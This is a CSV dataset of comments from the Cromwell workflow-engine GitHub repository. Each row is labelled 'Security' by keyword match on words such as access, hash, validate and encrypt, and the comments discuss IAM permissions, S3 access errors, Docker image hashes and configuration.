Security,"Would having that information (filesystems configured for a backend) in the existing backend endpoint work for you ? I don't think we can consider a generic ""get a config value"" endpoint as it would be a massive security hole because the configuration contains secrets and passwords.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430:212,secur,security,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430,2,"['password', 'secur']","['passwords', 'security']"
Security,"Would you mind explaining the difference between `pull` and `build`? The reason I did build is because I needed to know where the output image ended up, so I could run it directly. If I `singularity pull docker://ubuntu`'d the image, and then `singularity run docker://ubuntu` from the worker, it would still try to pull the image a second time, and then hang forever because it didn't have network access. . Also, isn't the ability to build a binary image something that `build` can do, not `pull`?. The only reason I built a sandbox instead is simply because my admins wouldn't set the `setuid` bit, so it wouldn't work. Am I missing something here?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333:399,access,access,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333,2,['access'],['access']
Security,XhwcmVzc2lvbi9yZW5hbWluZy9CaW5hcnlPcGVyYXRvckV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...l/services/womtool/models/WomTypeJsonSupport.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21haW4vc2NhbGEvY3JvbXdlbGwvc2VydmljZXMvd29tdG9vbC9tb2RlbHMvV29tVHlwZUpzb25TdXBwb3J0LnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...end/impl/sfs/config/CpuDeclarationValidation.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvc2ZzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9zZnMvY29uZmlnL0NwdURlY2xhcmF0aW9uVmFsaWRhdGlvbi5zY2FsYQ==) | `0% <0%> (-100%)` | :arrow_down: |; | [...aft2/src/main/scala/wdl/draft2/model/package.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL21vZGVsL2RyYWZ0Mi9zcmMvbWFpbi9zY2FsYS93ZGwvZHJhZnQyL21vZGVsL3BhY2thZ2Uuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...ool/src/main/scala/womtool/validate/Validate.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d29tdG9vbC9zcmMvbWFpbi9zY2FsYS93b210b29sL3ZhbGlkYXRlL1ZhbGlkYXRlLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...king/expression/files/BiscayneFileEvaluators.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvc3JjL21haW4vc2NhbGEvd2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvbGlua2luZy9leHByZXNzaW9uL2ZpbGVzL0Jpc2NheW5lRmlsZUV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...in/scala/cromwell/backend/impl/bcs/BcsDocker.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvYmNzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9iY3MvQmNzRG9ja2VyLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...in/scala/cromwell/services/metadata/metadata.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21ha,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620:2925,validat,validate,2925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620,3,"['Validat', 'validat']","['Validate', 'validate']"
Security,"YAML claims to be a superset of JSON, but it is not (as this proves). Every time I have encountered YAML in a project it has been a headache, just my 2c. It is a strange syntax, with the potential for infinite recursion and bombs. It makes for a hard parser implementation, and there have been security and perfomance issues in the past. Fine for local configuration files, but probably not a good idea for any public facing APIs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556:294,secur,security,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556,1,['secur'],['security']
Security,"Yeah actually sorry I was giving @kshakir and the rest of you a hard time about the parent column. I thought about it a lot yesterday and realized that it does actually make sense. The key to it, which I think I didn't fully appreciate at the time, was that it was shards pointing to shards, which is the thing that the Namespace is not capturing. Using this approach we now have a way to keep track of multiple levels of scattering. For any entry, we can find all `Scatter` ancestors entries in the ExecutionStore and then we have the `Scatter` objects (in order going up the tree) along with their respective indexes. The lookup function (which resolves WDL identifiers into their values), should only need access to some data structure like this: `Seq[(item: String, collection: WdlExpression, index: Int)]`. Where the size of that `Seq` would be the same size as the number of times nested you are. This would allow it to properly index into the scattered arrays.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133389325:709,access,access,709,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133389325,1,['access'],['access']
Security,"Yeah, this was from way back when we on FC thought we'd be parsing the WDL and doing docker-hash switcheroos ourselves. But you ended up doing it! So my use case for needing this has gone away.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335903681:92,hash,hash,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335903681,1,['hash'],['hash']
Security,"Yep, you were right about this bug, it was because the IAM role that Cromwell uses did not have write access to the S3 bucket. The actual AWS Batch worker instances did have write access, so the workflow didn't fail until it hit `write_lines`, which is executed by the Cromwell server, not by the Batch machine. However, this is actually the fault of the CloudFormation scripts that generated this role. I used the scripts [hosted here](https://s3.amazonaws.com/aws-genomics-workflows/templates/cromwell/cromwell-server.template.yaml), from [this webpage](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/). Notice how the IAM role only has `s3:GetObject` permissions, not `PutObject` etc:. ```yaml; Ec2InstanceRole:; Type: AWS::IAM::Role; Properties:; Policies:; - PolicyName: !Sub CromwellServer-S3Bucket-Access-${AWS::Region}; PolicyDocument:; Version: 2012-10-17; Statement:; Effect: Allow; Resource: !Join ["""", [""arn:aws:s3:::"", !Ref S3BucketName, ""/*""]]; Action:; - ""s3:GetObject""; ```. @aednichols Do you happen to know who wrote these scripts or where the code is hosted? Because I would like to submit a change to them to fix this bug",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-431235259:102,access,access,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-431235259,3,"['Access', 'access']","['Access', 'access']"
Security,"Yes I think the `-` needs to be escaped.; If you could also make the same change on line 52, and add a new line with your docker image in the table in `DockerImageIdentifierSpec` to validate that it works it would be great :). Thanks !",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2591#issuecomment-326665158:182,validat,validate,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2591#issuecomment-326665158,1,['validat'],['validate']
Security,Yes if the validation is going to be centralized here there have to be tests that are at least equivalent to what's in `WorkflowDescriptor`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197048096:11,validat,validation,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197048096,1,['validat'],['validation']
Security,"Yes that surprised me too. The numbers are averages so it's possible that it kinds of flattens out around ~20/30ms, and the 10000 happened to have slightly better runs. It does it 30 times for each of the sizes. The minimum time value would be a better indicator maybe. Edit: Did the same with min times. There's still a weird timing where 8K was longer.; The main difference between the 2 approaches is that before we would go through the list of ""done"" keys one by one until we find the one we want. Which means the longer the list the longer the time in average. However now we go through it once to create a map, and then it becomes a hash lookup every other time. for develop:. <img width=""326"" alt=""screen shot 2017-04-22 at 12 28 58 pm"" src=""https://cloud.githubusercontent.com/assets/2978948/25306250/5dcc9d1c-2757-11e7-8987-0aaec4d4a038.png"">. and this branch:; <img width=""323"" alt=""screen shot 2017-04-22 at 12 23 06 pm"" src=""https://cloud.githubusercontent.com/assets/2978948/25306253/68140aa8-2757-11e7-8483-f6f2770c031d.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2198#issuecomment-296384021:639,hash,hash,639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2198#issuecomment-296384021,1,['hash'],['hash']
Security,"Yes there are! Like if your inputs are shared with other users and they; come from varying sources and you're not allowed to make copies. Something; like that is very common. On Fri, Jun 7, 2019 at 7:25 PM W. Lee Pang, PhD <notifications@github.com>; wrote:. > This line in the stack trace indicates the root cause:; >; > at software.amazon.awssdk.services.s3.S3Client.listBuckets(S3Client.java:2184); >; > The permissions for the Cromwell server currently only provide full access; > to the S3 bucket specified in the CloudFormation template. Adding the; > AmazonS3ReadOnlyAccess managed policy to the server's instance profile; > fixes this, but I wonder if it can be more refined. Specifically, is there; > a case where a Cromwell server would need to read from more than one bucket?; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/4686?email_source=notifications&email_token=ADR7XTOW5ARNYDZTLRZEEODPZLU6RA5CNFSM4G2ZBAQ2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGODXHHEUY#issuecomment-500068947>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ADR7XTOOSUHDDDUED4MXDEDPZLU6RANCNFSM4G2ZBAQQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500810085:475,access,access,475,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500810085,1,['access'],['access']
Security,"Yes, that's granting it at the project level (`gcloud projects add-iam-policy-binding`).; Granting at the SA level would probably be in this case; ```; gcloud iam service-accounts add-iam-policy-binding \; serviceAccount:MY-NUMBER-compute@developer.gserviceaccount.com \; --member serviceAccount:MY-NUMBER-compute@developer.gserviceaccount.com \; --role roles/iam.serviceAccountUser; ```; Notice that here we grant `MY-NUMBER-compute` SA `iam.serviceAccountUser` role on itself! This is probably not the best practice, as you should use a separate SA for Cromwell VM from the one that is used by Cromwell jobs.; Still, this is better than granting it at the project level, as otherwise any machine started with the default `MY-NUMBER-compute` SA can act as any other SA in that project. Additionally, it's not good to use the default SA at all, ideally you should create a dedicated SA for Cromwell itself and also another dedicated SA for the Cromwell jobs. That being said, if you're running this in an isolated project that doesn't have any access to anything else, this may be fine. But that's why it takes quite a bit of effort/know-how to set up Cromwell properly. I agree this is not an easy task, and should be documented a bit more ;)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686192065:1044,access,access,1044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686192065,1,['access'],['access']
Security,"Yes... although since the 'encrypted-fields' is blank it probably doesn't; matter a whole lot but this does seem a little odd to me. Anyone know why; this was put in here?. ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Mon, Nov 23, 2015 at 3:55 PM, Chris Llanwarne notifications@github.com; wrote:. > I see in application.conf the following. Is this a candidate for storing; > securely in vault?; > ; > workflow-options {; > // These workflow options will be encrypted when stored in the database; > encrypted-fields: []; > ; > // AES-256 key to use to encrypt the values in encrypted-fields; > base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""; > }; > ; > —; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159061507; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159069141:27,encrypt,encrypted-fields,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159069141,7,"['encrypt', 'secur']","['encrypt', 'encrypted', 'encrypted-fields', 'encryption-key', 'securely']"
Security,"You're specifying both a tag and a hash, which you're right docker recognizes as a valid image (surprisingly I must say). We should fix Cromwell to validate that correctly. In the meantime if you use `quay.io/biocontainers/star@sha256:352f627075e436016ea2c38733b5c0096bb841e2fadcbbd3d4ae8daf03ccdf1b` it should work",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2254#issuecomment-300552698:35,hash,hash,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2254#issuecomment-300552698,2,"['hash', 'validat']","['hash', 'validate']"
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3969,access,access,3969,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5223,access,access,5223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6477,access,access,6477,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7731,access,access,7731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8985,access,access,8985,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10239,access,access,10239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11493,access,access,11493,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
